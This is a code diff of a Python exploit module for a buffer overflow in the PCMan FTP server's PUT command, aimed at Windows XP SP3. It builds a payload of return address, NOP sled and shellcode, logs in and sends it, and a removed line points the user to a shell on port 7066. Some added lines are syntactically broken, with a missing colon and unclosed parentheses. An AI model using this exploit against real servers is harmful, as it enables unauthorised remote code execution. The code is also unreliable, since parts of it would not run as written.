@@ -7,20 +7,18 @@ class pcmanPutOverflowMenu(core.Exploit):
     p += "\x77\xc3\x54\x59"
     p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     p += self.get_shellcode()
-    print "[+]Payload generated."
-    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect((self.host[0], 21))
+  def deliver(self, p)
+    self.init_deliver()
+    s = self.connect()
     s.recv(1024)
-    s.send("USER " + self.user[0])
+    s.send("USER " + self.variables["user"]
     s.recv(1024)
-    s.send("PASS " + self.passwd[0])
+    s.send("PASS " + self.variables["passwd"]
     s.recv(1024)
-    s.send("PUT " + payload)\
-    s.close()
-    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+    s.send("PUT " + p)
+    self.disconnect(s)
 def main():
-  pcmanputoverflowmenu = pcmanPutOverflowMenu()
+  pcmanputoverflowmenu = pcmanPutOverflowMenu('pcman_put_overflow', 'Windows XP SP3 English', 'pcman_put.shell', {'user':'anonymous', 'passwd':'anonymous@example.com', 'host':''}, {'user':'the user to login as', 'passwd':'the password to use to login', 'host':'the ip of the target'})
   pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
-if __name__ == __main__:
+if __name__ == '__main__':
   main()
